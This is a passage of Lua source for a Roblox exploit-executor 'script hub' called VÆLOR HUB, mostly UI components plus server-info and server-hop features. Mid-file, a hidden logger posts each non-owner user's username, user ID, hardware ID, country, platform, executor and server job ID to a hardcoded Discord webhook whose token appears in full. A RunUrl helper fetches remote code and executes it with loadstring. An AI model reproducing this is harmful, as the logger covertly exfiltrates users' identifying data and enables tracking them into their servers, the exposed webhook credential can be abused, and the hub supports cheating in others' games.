		component:SetValue(min + (max - min) * alpha, false, true)
		if component.Value ~= before then
			changed = true
		end
	end

	window.Maid:Add(hit.InputBegan:Connect(function(input)
		if isPointerInput(input) then
			dragging, dragInput, changed = true, input, false
			setFromX(input.Position.X)
		end
	end))
	window.Maid:Add(UserInputService.InputChanged:Connect(function(input)
		if not dragging then
			return
		end
		local inputType = input.UserInputType
		if inputType == Enum.UserInputType.MouseMovement or (inputType == Enum.UserInputType.Touch and input == dragInput) then
			setFromX(input.Position.X)
		end
	end))
	window.Maid:Add(UserInputService.InputEnded:Connect(function(input)
		if not dragging then
			return
		end
		local inputType = input.UserInputType
		if inputType == Enum.UserInputType.MouseButton1 or (inputType == Enum.UserInputType.Touch and input == dragInput) then
			dragging = false
			if config.OnRelease and changed then
				safeCall(window, name, config.Callback, component.Value)
			end
		end
	end))

	return component
end)

-- Component: Dropdown (Options = table, or a function that returns a table each time it opens) ----
Library:RegisterComponent("Dropdown", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Dropdown")
	local flag = config.Flag
	local HEADER, ITEM_H, MAX_VISIBLE = 40, 26, 5

	local selected = config.Default
	if flag then
		selected = Config:Get(flag, selected)
	end

	local row = tab:_CreateRow(HEADER)
	row.ClipsDescendants = true
	tab:_Index(row, name)

	create("TextLabel", {
		Name = "DropdownName",
		Size = UDim2.new(0.45, -12, 0, HEADER),
		Position = UDim2.fromOffset(12, 0),
		BackgroundTransparency = 1,
		Text = name,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})

	local selector = create("TextButton", {
		Name = "Selector",
		AnchorPoint = Vector2.new(1, 0),
		Position = UDim2.new(1, -10, 0, 6),
		Size = UDim2.new(0.55, -10, 0, 28),
		BackgroundColor3 = theme.SurfaceLight,
		AutoButtonColor = false,
		Text = "",
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextTruncate = Enum.TextTruncate.AtEnd,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(selector, 7)
	addPadding(selector, 0, 8, 0, 8)
	window:_AddButtonFx(selector, theme.SurfaceLight, theme.AccentDark)

	local list = create("ScrollingFrame", {
		Name = "Options",
		Position = UDim2.fromOffset(8, HEADER + 2),
		Size = UDim2.new(1, -16, 0, 0),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 2,
		ScrollBarImageColor3 = theme.Accent,
		CanvasSize = UDim2.new(),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		Parent = row,
	})
	create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 3), Parent = list })

	local component = { Name = name, Value = selected, Instance = row, IsOpen = false }

	local function displayText()
		if component.Value ~= nil then
			return tostring(component.Value)
		end
		return config.Placeholder or "Select..."
	end
	selector.Text = displayText()

	local function getOptions()
		local options = config.Options
		if type(options) == "function" then
			local ok, result = pcall(options)
			options = ok and result or {}
		end
		return type(options) == "table" and options or {}
	end

	local function rebuild()
		for _, child in ipairs(list:GetChildren()) do
			if not child:IsA("UIListLayout") then
				child:Destroy()
			end
		end
		local options = getOptions()
		if #options == 0 then
			create("TextLabel", {
				Size = UDim2.new(1, -6, 0, ITEM_H),
				BackgroundTransparency = 1,
				Text = "No options available",
				TextColor3 = theme.SubText,
				Font = Enum.Font.Gotham,
				TextSize = 12,
				Parent = list,
			})
		end
		for index, option in ipairs(options) do
			local button = create("TextButton", {
				LayoutOrder = index,
				Size = UDim2.new(1, -6, 0, ITEM_H),
				BackgroundColor3 = option == component.Value and theme.AccentDark or theme.SurfaceLight,
				AutoButtonColor = false,
				Text = tostring(option),
				TextColor3 = theme.Text,
				Font = Enum.Font.GothamMedium,
				TextSize = 12,
				TextTruncate = Enum.TextTruncate.AtEnd,
				BorderSizePixel = 0,
				Parent = list,
			})
			addCorner(button, 6)
			button.Activated:Connect(function()
				component:SetValue(option)
				component:Close()
			end)
		end
		return #options
	end

	function component:Open()
		if self.IsOpen or window._destroyed then
			return
		end
		self.IsOpen = true
		local count = rebuild()
		local listHeight = math.max(math.min(count, MAX_VISIBLE), 1) * (ITEM_H + 3)
		list.Size = UDim2.new(1, -16, 0, listHeight)
		window:Tween(row, TI.Medium, { Size = UDim2.new(1, 0, 0, HEADER + 2 + listHeight + 8) })
	end

	function component:Close()
		if not self.IsOpen then
			return
		end
		self.IsOpen = false
		window:Tween(row, TI.Medium, { Size = UDim2.new(1, 0, 0, HEADER) })
	end

	function component:SetValue(option, silent)
		self.Value = option
		selector.Text = displayText()
		if flag then
			Config:Set(flag, option)
		end
		if not silent then
			safeCall(window, name, config.Callback, option)
		end
	end

	function component:SetOptions(options)
		config.Options = options
		if self.IsOpen then
			rebuild()
		end
	end

	window.Maid:Add(selector.Activated:Connect(function()
		if component.IsOpen then
			component:Close()
		else
			component:Open()
		end
	end))

	return component
end)

-- Component: Keybind (click, then press a key; Escape cancels; saved as the key's name) ----------
Library:RegisterComponent("Keybind", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Keybind")
	local description = config.Description
	local hasDescription = type(description) == "string" and description ~= ""
	local flag = config.Flag

	local default = config.Default
	if typeof(default) == "EnumItem" then
		default = default.Name
	end
	local keyName = tostring(default or "None")
	if flag then
		keyName = tostring(Config:Get(flag, keyName))
	end

	local row = tab:_CreateRow(rowHeightFor(description))
	addRowLabels(row, theme, name, description, 124)
	tab:_Index(row, name .. " " .. (hasDescription and description or ""))

	local button = create("TextButton", {
		Name = "KeyButton",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -10, 0.5, 0),
		Size = UDim2.fromOffset(100, 28),
		BackgroundColor3 = theme.SurfaceLight,
		AutoButtonColor = false,
		Text = keyName,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 12,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(button, 7)
	addStroke(button, theme.AccentDark, 1, 0.3)
	window:_AddButtonFx(button, theme.SurfaceLight, theme.AccentDark)

	local component = { Name = name, Key = keyName, Instance = row }
	local capturing, connection = false, nil

	local function stopCapture()
		if connection then
			connection:Disconnect()
			connection = nil
		end
		capturing = false
		button.Text = component.Key
		-- small delay so the key that was just bound does not also trigger its own action
		task.delay(0.15, function()
			window._rebinding = false
		end)
	end
	window.Maid:Add(function()
		if connection then
			connection:Disconnect()
		end
	end)

	function component:SetKey(newKey, silent)
		self.Key = tostring(newKey)
		button.Text = self.Key
		if flag then
			Config:Set(flag, self.Key)
		end
		if not silent then
			safeCall(window, name, config.Callback, self.Key)
		end
	end

	window.Maid:Add(button.Activated:Connect(function()
		if capturing then
			return
		end
		capturing = true
		window._rebinding = true
		button.Text = "Press a key..."
		connection = UserInputService.InputBegan:Connect(function(input)
			if input.UserInputType ~= Enum.UserInputType.Keyboard then
				return
			end
			local key = input.KeyCode
			stopCapture()
			if key ~= Enum.KeyCode.Escape then
				component:SetKey(key.Name)
			end
		end)
		task.delay(8, function()
			if capturing then
				stopCapture()
			end
		end)
	end))

	return component
end)

-- Component: Textbox (name + input; Callback(text, enterPressed) when it loses focus) -------------
Library:RegisterComponent("Textbox", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Textbox")

	local row = tab:_CreateRow(40)
	tab:_Index(row, name)

	create("TextLabel", {
		Name = "TextboxName",
		Position = UDim2.fromOffset(12, 0),
		Size = UDim2.new(0.35, -12, 1, 0),
		BackgroundTransparency = 1,
		Text = name,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	local box = create("TextBox", {
		Name = "Input",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -10, 0.5, 0),
		Size = UDim2.new(0.65, -20, 0, 28),
		BackgroundColor3 = theme.SurfaceLight,
		Text = tostring(config.Text or ""),
		PlaceholderText = config.Placeholder or "Type here...",
		PlaceholderColor3 = theme.SubText,
		TextColor3 = theme.Text,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		ClearTextOnFocus = false,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(box, 7)
	addPadding(box, 0, 8, 0, 8)
	local stroke = addStroke(box, theme.AccentDark, 1, 0.3)

	window.Maid:Add(box.Focused:Connect(function()
		window:Tween(stroke, TI.Fast, { Color = theme.Accent })
	end))
	window.Maid:Add(box.FocusLost:Connect(function(enterPressed)
		window:Tween(stroke, TI.Fast, { Color = theme.AccentDark })
		safeCall(window, name, config.Callback, box.Text, enterPressed)
	end))

	local component = { Name = name, Instance = row }
	function component:GetText()
		return box.Text
	end
	function component:SetText(text)
		box.Text = tostring(text or "")
	end
	return component
end)

--==================================================================================================
-- Library:CreateWindow
--==================================================================================================
function Library:CreateWindow(config)
	config = config or {}

	-- Re-execution: destroys the previous instance with the same name (avoids duplicates/leaks)
	local env = getEnv()
	local name = tostring(config.Name or "Loader")
	local key = INSTANCE_KEY .. name
	local previous = env[key]
	if type(previous) == "table" and type(previous.Destroy) == "function" then
		pcall(function()
			previous:Destroy()
		end)
	end

	local self = setmetatable({
		Name = name,
		Theme = resolveTheme(config.Theme),
		Size = typeof(config.Size) == "UDim2" and config.Size or UDim2.fromOffset(400, 300),
		Maid = Maid.new(),
		Tweens = {},
		Tabs = {},
		GamesById = {},
		GameList = {},
		Gradients = {},
		State = { Minimized = false, PopupOpen = false },
		_destroyed = false,
		_tabCounter = 0,
		_notifyCounter = 0,
		_notifications = {},
		_userSelected = false,
		_rebinding = false,
		UserScale = math.clamp(tonumber(Config:Get("uiScale", 1)) or 1, 0.5, 1.5),
		Logs = {},
		_logListeners = {},
		ToggleKey = type(config.ToggleKey) == "string" and config.ToggleKey or nil,
	}, Window)

	env[key] = self

	local ok, err = pcall(function()
		self:_BuildGui()
		self:_BuildTopbar()
		self:_BuildTabArea()
		self:_BuildNotifications()
		self:_BuildFloatingButton()
		self:_StartAnimationLoop()

		-- Keyboard shortcut: show / hide the hub (key is configurable in Settings)
		self.Maid:Add(UserInputService.InputBegan:Connect(function(input, processed)
			if processed or self._rebinding or UserInputService:GetFocusedTextBox() then
				return
			end
			if input.UserInputType ~= Enum.UserInputType.Keyboard then
				return
			end
			if input.KeyCode.Name == (self.ToggleKey or Config:Get("toggleKey", "RightShift")) then
				if self.State.Minimized then
					self:Restore()
				else
					self:Minimize()
				end
			end
		end))

		if config.ShowSupportTab ~= false then
			local supportTab = self:CreateTab(SUPPORT_TAB_NAME, { Internal = true })
			self:_SetupSupportTab(supportTab)
		end
		self:RefreshTabs()
	end)

	if not ok then
		self:Destroy()
		error("[Library] Failed to create the window: " .. tostring(err), 2)
	end

	return self
end

--==================================================================================================
-- PART 2 — LOADER CONFIGURATION (USAGE)
--==================================================================================================
-- Load saved settings first (theme, UI scale, favorites, ...)
Config:Load()

local Loader = Library:CreateWindow({
	Name = "VÆLOR HUB",
	Theme = Config:Get("themeV2", "Purple"),
	Size = UDim2.fromOffset(600, 400),
	ShowSupportTab = false,
})

local DISCORD_LINK = "https://discord.gg/HHXF4QwTrq"
local HUB_VERSION = Library.Version
-- Raw link to a text file that contains only the latest version number (e.g. "1.2.0").
-- Leave empty to disable update checks.
local VERSION_URL = ""

-- Helper: runs a script from a raw link. Empty link = clear error notification instead of a crash.
local function RunUrl(url)
	if type(url) ~= "string" or url == "" then
		error("Link not set for this script yet.")
	end
	if not loadstring then
		error("Your executor does not support loadstring.")
	end

	local okGet, body = pcall(game.HttpGet, game, url)
	if not okGet then
		error("Download failed: " .. tostring(body))
	end
	if type(body) ~= "string" or body == "" then
		error("Link returned an empty response.")
	end
	if string.sub(body, 1, 1) == "<" or string.find(body, "^404") then
		error("Link is not a raw script (web page or 404).")
	end

	local fn, err = loadstring(body)
	if not fn then
		error("Script has a syntax error: " .. tostring(err))
	end
	fn()
end

--==================================================================================================
-- INFO TAB (first tab): hub + discord, credits, live stats, rejoin / server hop
--==================================================================================================
local InfoPlayers = game:GetService("Players")
local InfoRunService = game:GetService("RunService")
local InfoStats = game:GetService("Stats")
local InfoTeleport = game:GetService("TeleportService")
local InfoHttp = game:GetService("HttpService")
local InfoTheme = Loader.Theme
local LocalPlayer = InfoPlayers.LocalPlayer

local Info = Loader:CreateTab("Info")

-- Hub + Discord button
local DiscordBtn = Info:CreateButton({
    Name = "VÆLOR HUB",
    Description = "Join our Discord for updates and new scripts",
    ButtonText = "Discord",
    Image = "rbxassetid://100225738070413",

    Callback = function()
        local copy = setclipboard or toclipboard
        if copy then
            copy(DISCORD_LINK)
            Loader:Notify({
                Title = "Discord",
                Content = "Invite link copied to clipboard!",
                Type = "Success",
                Duration = 3
            })
        else
            Loader:Notify({
                Title = "Discord",
                Content = DISCORD_LINK,
                Type = "Info",
                Duration = 8
            })
        end
    end,
})


-- Discord server logo: automatically downloaded from the invite and applied to the button.
-- (Fixes rbxassetid logos that fail to load because the ID is a Decal / private / unmoderated.)
task.spawn(function()
    local logo = DiscordBtn and DiscordBtn.Logo
    local floatLogo = Loader.Floating and Loader.Floating:FindFirstChild("Logo")
    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    local asset = getcustomasset or getsynasset
    if not (req and writefile and asset) then
        return -- executor unsupported: floating button keeps the letter (never blank)
    end

    local code = DISCORD_LINK:match("discord%.gg/([%w%-_]+)") or DISCORD_LINK:match("discord%.com/invite/([%w%-_]+)")
    if not code then return end

    local okInv, res = pcall(req, { Url = "https://discord.com/api/v10/invites/" .. code, Method = "GET" })
    if not okInv or type(res) ~= "table" or type(res.Body) ~= "string" then return end

    local okJson, data = pcall(InfoHttp.JSONDecode, InfoHttp, res.Body)
    local guild = okJson and type(data) == "table" and data.guild
    if not (guild and guild.id and guild.icon) then return end

    local url = ("https://cdn.discordapp.com/icons/%s/%s.png?size=128"):format(guild.id, guild.icon)
    local okImg, img = pcall(req, { Url = url, Method = "GET" })
    if not okImg or type(img) ~= "table" or img.StatusCode ~= 200 or type(img.Body) ~= "string" then return end

    pcall(function()
        writefile("vaelor_discord_logo.png", img.Body)
        local path = asset("vaelor_discord_logo.png")
        if logo then
            logo.Image = path
        end
        if floatLogo and floatLogo.Parent then
            floatLogo.Image = path
            floatLogo.Visible = true
            floatLogo.Parent.Text = ""
        end
    end)
end)


-- Credits
Info:CreateSection({ Text = "Credits" })
Info:CreateStat({ Name = "Owner", Value = "N0T_Z0RO100" })

Info:CreateSection({ Text = "Admin" })
Info:CreateLabel({ Text = "rdjrnkdmf" })


Info:CreateSection({ Text = "Server Info" })
local PlayerStat = Info:CreateStat({ Name = "Player Count", Value = "-" })
local GameStat = Info:CreateStat({ Name = "Current Game", Value = "Loading..." })
local FpsStat = Info:CreateStat({ Name = "FPS", Value = "-" })
local PingStat = Info:CreateStat({ Name = "Ping", Value = "-" })

-- Game name (cached by the library)
fetchGameInfo(game.PlaceId, function(info)
	if GameStat and not Loader._destroyed then
		GameStat:SetValue(info.Name)
	end
end)

-- FPS counter (frames counted on Heartbeat, read every 0.5s)
local fpsFrames = 0
Loader:AddCleanup(InfoRunService.Heartbeat:Connect(function()
	fpsFrames += 1
end))

local function getPing()
	local ok, value = pcall(function()
		return InfoStats.Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	if ok and type(value) == "number" then
		return math.floor(value + 0.5)
	end
	local ok2, fallback = pcall(function()
		return LocalPlayer:GetNetworkPing() * 2000
	end)
	if ok2 and type(fallback) == "number" then
		return math.floor(fallback + 0.5)
	end
	return nil
end

task.spawn(function()
	local lastCheck = os.clock()
	while not Loader._destroyed do
		task.wait(0.5)
		if Loader._destroyed then
			break
		end

		local now = os.clock()
		local fps = math.floor(fpsFrames / math.max(now - lastCheck, 0.001) + 0.5)
		fpsFrames = 0
		lastCheck = now

		if PlayerStat then
			PlayerStat:SetValue(#InfoPlayers:GetPlayers() .. " / " .. InfoPlayers.MaxPlayers)
		end
		if FpsStat then
			local color = fps >= 50 and InfoTheme.Success or (fps >= 30 and InfoTheme.Warning or InfoTheme.Error)
			FpsStat:SetValue(tostring(fps), color)
		end
		if PingStat then
			local ping = getPing()
			if ping then
				local color = ping < 80 and InfoTheme.Success or (ping < 150 and InfoTheme.Warning or InfoTheme.Error)
				PingStat:SetValue(ping .. " ms", color)
			else
				PingStat:SetValue("N/A")
			end
		end
	end
end)

-- Rejoin / Server hop
Info:CreateSection({ Text = "Server Actions" })

Info:CreateButton({
	Name = "Rejoin",
	Description = "Reconnect to the game (same server if others are in it)",
	ButtonText = "Rejoin",
	Callback = function()
		Loader:Notify({ Title = "Rejoin", Content = "Rejoining...", Type = "Info", Duration = 3 })
		if #InfoPlayers:GetPlayers() <= 1 then
			InfoTeleport:Teleport(game.PlaceId, LocalPlayer)
		else
			InfoTeleport:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
		end
	end,
})

Info:CreateButton({
	Name = "Server Hop",
	Description = "Join a different public server of this game",
	ButtonText = "Server Hop",
	Callback = function()
		local candidates = {}
		local cursor = nil

		for _ = 1, 3 do -- check up to 3 pages (100 servers each)
			local url = ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(tostring(game.PlaceId))
			if cursor then
				url ..= "&cursor=" .. cursor
			end

			local okGet, body = pcall(function()
				return game:HttpGet(url)
			end)
			if not okGet then
				error("Could not reach the Roblox server list.")
			end

			local okJson, data = pcall(function()
				return InfoHttp:JSONDecode(body)
			end)
			if not okJson or type(data) ~= "table" or type(data.data) ~= "table" then
				error("Unexpected response from the server list.")
			end

			for _, server in ipairs(data.data) do
				if server.id ~= game.JobId
					and type(server.playing) == "number"
					and type(server.maxPlayers) == "number"
					and server.playing < server.maxPlayers - 1
				then
					table.insert(candidates, server.id)
				end
			end

			if #candidates > 0 or not data.nextPageCursor then
				break
			end
			cursor = data.nextPageCursor
		end

		if #candidates == 0 then
			Loader:Notify({ Title = "Server Hop", Content = "No other available servers found.", Type = "Warning", Duration = 4 })
			return
		end

		Loader:Notify({ Title = "Server Hop", Content = "Joining a new server...", Type = "Info", Duration = 3 })
		InfoTeleport:TeleportToPlaceInstance(game.PlaceId, candidates[math.random(1, #candidates)], LocalPlayer)
	end,
})

--==================================================================================================
-- USERS TAB: "VÆLOR USER" card (profile picture + display name + @username)
--==================================================================================================
Library:RegisterComponent("UserCard", function(tab, config)
	local theme = tab.Window.Theme
	local hasExecutor = config.Executor ~= nil
	local row, stroke = tab:_CreateRow(hasExecutor and 92 or 78)
	local solidStroke
	local isRGB = config.Title == "OWNER" or config.Title == "ADMIN"
	if config.Color then
		-- animated border takes the rank color
		local gradient = stroke:FindFirstChildOfClass("UIGradient")
		if gradient then
			local dark = config.Color:Lerp(Color3.new(0, 0, 0), 0.5)
			gradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, dark),
				ColorSequenceKeypoint.new(0.5, config.Color),
				ColorSequenceKeypoint.new(1, dark),
			})
		end
		-- always-visible solid border
		solidStroke = addStroke(row, config.Color, 2, 0.1)
	end
	if config.Sort then
		row.LayoutOrder = row.LayoutOrder + config.Sort -- owner 0, admin 500, others 1000 => owner/admin on top
	end

	local avatar = create("ImageLabel", {
		Name = "Avatar",
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 12, 0.5, 0),
		Size = UDim2.fromOffset(56, 56),
		BackgroundColor3 = theme.SurfaceLight,
		BorderSizePixel = 0,
		Image = config.Image or "",
		Parent = row,
	})
	addCorner(avatar, 28)
	local avatarStroke = addStroke(avatar, config.Color or theme.Accent, 2, 0)

	create("TextLabel", {
		Name = "JoinedTitle",
		Position = UDim2.fromOffset(80, 10),
		Size = UDim2.new(1, -92, 0, 18),
		BackgroundTransparency = 1,
		Text = tostring(config.Title or "VÆLOR USER"),
		TextColor3 = config.Color or theme.Accent,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	create("TextLabel", {
		Name = "DisplayName",
		Position = UDim2.fromOffset(80, 29),
		Size = UDim2.new(1, -92, 0, 20),
		BackgroundTransparency = 1,
		Text = tostring(config.DisplayName or ""),
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	create("TextLabel", {
		Name = "Username",
		Position = UDim2.fromOffset(80, 49),
		Size = UDim2.new(1, -92, 0, 16),
		BackgroundTransparency = 1,
		Text = "@" .. tostring(config.Username or ""),
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	if hasExecutor then
		create("TextLabel", {
			Name = "Executor",
			Position = UDim2.fromOffset(80, 66),
			Size = UDim2.new(1, -92, 0, 16),
			BackgroundTransparency = 1,
			Text = tostring(config.Executor),
			TextColor3 = theme.AccentLight,
			Font = Enum.Font.GothamMedium,
			TextSize = 12,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextTruncate = Enum.TextTruncate.AtEnd,
			Parent = row,
		})
	end

	-- OWNER / ADMIN cards: RGB cycle Red > Green > Blue (border, avatar ring and title)
	if isRGB then
		local RED, GREEN, BLUE = Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255)
		local gradient = stroke:FindFirstChildOfClass("UIGradient")
		if gradient then
			gradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, RED),
				ColorSequenceKeypoint.new(0.33, GREEN),
				ColorSequenceKeypoint.new(0.66, BLUE),
				ColorSequenceKeypoint.new(1, RED),
			})
		end
		local title = row:FindFirstChild("JoinedTitle")
		local function cycle(t)
			t = t % 1
			if t < 1 / 3 then
				return RED:Lerp(GREEN, t * 3)
			elseif t < 2 / 3 then
				return GREEN:Lerp(BLUE, (t - 1 / 3) * 3)
			end
			return BLUE:Lerp(RED, (t - 2 / 3) * 3)
		end
		local conn
		conn = game:GetService("RunService").Heartbeat:Connect(function()
			if not row.Parent then
				conn:Disconnect()
				return
			end
			local color = cycle(os.clock() / 3)
			if solidStroke then
				solidStroke.Color = color
			end
			avatarStroke.Color = color
			if title then
				title.TextColor3 = color
			end
		end)
	end

	return {
		Instance = row,
		Remove = function()
			if row.Parent then
				row:Destroy()
			end
		end,
	}
end)

-- Card title by username: OWNER / ADMIN, everyone else = VÆLOR USER
local CARD_RANKS = { ["n0t_z0ro100"] = "OWNER", ["rdjrnkdmf"] = "ADMIN" }
Library.VipSet = {} -- lowercase usernames with the VIP title (filled from Firebase /vip)
Library.MutedSet = {} -- lowercase usernames muted in Global Chat (Firebase /muted)
Library.BannedSet = {} -- lowercase usernames banned from the hub (Firebase /banned)
function Library.GetExecutorName()
	local env = (getgenv and getgenv()) or _G
	local ok, name, version = pcall(function()
		if identifyexecutor then
			return identifyexecutor()
		elseif getexecutorname then
			return getexecutorname()
		end
	end)
	if ok and name and tostring(name) ~= "" then
		local text = tostring(name)
		if version and tostring(version) ~= "" then
			text = text .. " " .. tostring(version)
		end
		return string.sub(text, 1, 30)
	end
	-- Fallback: guess from well-known executor globals
	if syn and syn.protect_gui then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif env.KRNL_LOADED then
		return "KRNL"
	elseif env.Delta or env.DELTA_LOADED then
		return "Delta"
	elseif env.Xeno then
		return "Xeno"
	end
	return "Unknown"
end

function Library.GetCardTitle(username)
	local lname = string.lower(tostring(username))
	return CARD_RANKS[lname] or (Library.VipSet[lname] and "VIP") or "VÆLOR USER"
end

do -- scoped so it adds no top-level locals
-- Execution log webhook: sends one embed to Discord each time the hub is loaded.
local WEBHOOK_URL = "https://discord.com/api/webhooks/1573602807536427081/v_3nE1GizCkSjtXtd40GtK_0ynfs9et1A-RHy9sVqg5AjGQMIs8shQkVroS0HER3mmzB"

task.spawn(function()
	local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
	if not req or WEBHOOK_URL == "" then
		return
	end

	local lp = Players.LocalPlayer

	-- OWNER / ADMIN are never logged
	local rank = Library.GetCardTitle(lp.Name)
	if rank == "OWNER" or rank == "ADMIN" then
		return
	end

	local gameName = "Unknown"
	pcall(function()
		gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)

	local executor = "Unknown"
	pcall(function()
		executor = Library.GetExecutorName()
	end)

	-- Country: Roblox region code (e.g. "IN") + flag emoji
	local country = "Unknown"
	pcall(function()
		local code = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(lp)
		if type(code) == "string" and #code == 2 then
			code = code:upper()
			local flag = utf8.char(0x1F1E6 + code:byte(1) - 65, 0x1F1E6 + code:byte(2) - 65)
			country = flag .. " " .. code
		end
	end)

	-- Platform: Android / iPhone / PC (from Roblox's own platform enum)
	local platform = "Unknown"
	pcall(function()
		local uis = game:GetService("UserInputService")
		local plat = uis:GetPlatform()
		if plat == Enum.Platform.Android then
			platform = "\u{1F4F1} Android (Mobile)"
		elseif plat == Enum.Platform.IOS then
			platform = "\u{1F4F1} iPhone/iPad (Mobile)"
		elseif plat == Enum.Platform.Windows or plat == Enum.Platform.OSX or plat == Enum.Platform.UWP
			or plat == Enum.Platform.Linux then
			platform = "\u{1F4BB} PC / Laptop"
		elseif uis.TouchEnabled and not uis.KeyboardEnabled then
			platform = "\u{1F4F1} Mobile"
		elseif uis.KeyboardEnabled then
			platform = "\u{1F4BB} PC / Laptop"
		else
			platform = tostring(plat):gsub("Enum.Platform.", "")
		end
	end)

	-- Profile picture (headshot) URL for the embed thumbnail
	local avatarUrl = nil
	pcall(function()
		local res = req({
			Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. lp.UserId
				.. "&size=150x150&format=Png&isCircular=false",
			Method = "GET",
		})
		if res and res.Body then
			local data = HttpService:JSONDecode(res.Body)
			avatarUrl = data and data.data and data.data[1] and data.data[1].imageUrl
		end
	end)

	-- HWID: unique device ID (executor gethwid, else Roblox client id)
	local hwid = "Unknown"
	pcall(function()
		local id = (gethwid and gethwid())
			or (get_hwid and get_hwid())
			or game:GetService("RbxAnalyticsService"):GetClientId()
		if id and tostring(id) ~= "" then
			hwid = tostring(id)
		end
	end)

	-- Teleport code: run this in an executor to join the same server
	local jobId = game.JobId ~= "" and game.JobId or "STUDIO"
	local teleportCode = string.format(
		'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
		game.PlaceId, jobId
	)

	local payload = HttpService:JSONEncode({
		username = "VÆLOR Logger",
		embeds = {{
			title = "Script Executed",
			color = 14493748, -- red
			thumbnail = avatarUrl and { url = avatarUrl } or nil,
			fields = {
				{ name = "Username", value = lp.Name .. " (" .. lp.DisplayName .. ")", inline = true },
				{ name = "User ID", value = tostring(lp.UserId), inline = true },
				{ name = "Executor", value = tostring(executor), inline = true },
				{ name = "Country", value = country, inline = true },
				{ name = "Platform", value = platform, inline = true },
				{ name = "HWID", value = "`" .. hwid .. "`", inline = false },
				{ name = "Game", value = gameName .. "\nPlaceId: " .. game.PlaceId, inline = false },
				{ name = "Job ID", value = "`" .. jobId .. "`", inline = false },
				{ name = "Teleport Code", value = "```lua\n" .. teleportCode .. "\n```", inline = false },
			},
			footer = { text = "VÆLOR HUB v" .. tostring(Library.Version) },
			timestamp = DateTime.now():ToIsoDate(),
		}},
	})

	pcall(req, {
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = payload,
	})
end)
end


local RANK_CARD_COLORS = {
	OWNER = Color3.fromRGB(170, 80, 255), -- royal purple
	ADMIN = Color3.fromRGB(40, 190, 255), -- electric cyan
	VIP = Color3.fromRGB(255, 105, 190), -- hot pink
}

function Library.GetCardColor(username)
	return RANK_CARD_COLORS[Library.GetCardTitle(username)] -- normal users = nil (theme red)
end

local Users = Loader:CreateTab("Users")
Users:CreateSection({ Text = "You" })

do
	local avatarImage = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150"
	-- Try the real headshot thumbnail; fall back to the rbxthumb link if the request fails.
	local okThumb, thumb = pcall(function()
		return InfoPlayers:GetUserThumbnailAsync(
			LocalPlayer.UserId,
			Enum.ThumbnailType.HeadShot,
			Enum.ThumbnailSize.Size150x150
		)
	end)
	if okThumb and type(thumb) == "string" and thumb ~= "" then
		avatarImage = thumb
	end

	Users:CreateUserCard({
		Title = Library.GetCardTitle(LocalPlayer.Name),
		Color = Library.GetCardColor(LocalPlayer.Name),
		DisplayName = LocalPlayer.DisplayName,
		Executor = Library.GetExecutorName(),
		Username = LocalPlayer.Name,
		Image = avatarImage,
	})

	Loader:Log("VÆLOR USER: " .. LocalPlayer.Name, "Success")
end

-- (moved up: runs right after the Users card so nothing later can block it)
do
-- Nametag system ------------------------------------------------------------
local TagPlayers = game:GetService("Players")

local RANKS = {
	OWNER = { "N0T_Z0RO100" },
	ADMIN = {
		"rdjrnkdmf",
	},
}

local function getRank(player)
	local name = string.lower(player.Name)
	for rankName, users in pairs(RANKS) do
		for _, user in ipairs(users) do
			if string.lower(user) == name then
				return rankName
			end
		end
	end
	if Library.VipSet[name] then
		return "VIP"
	end
	return nil
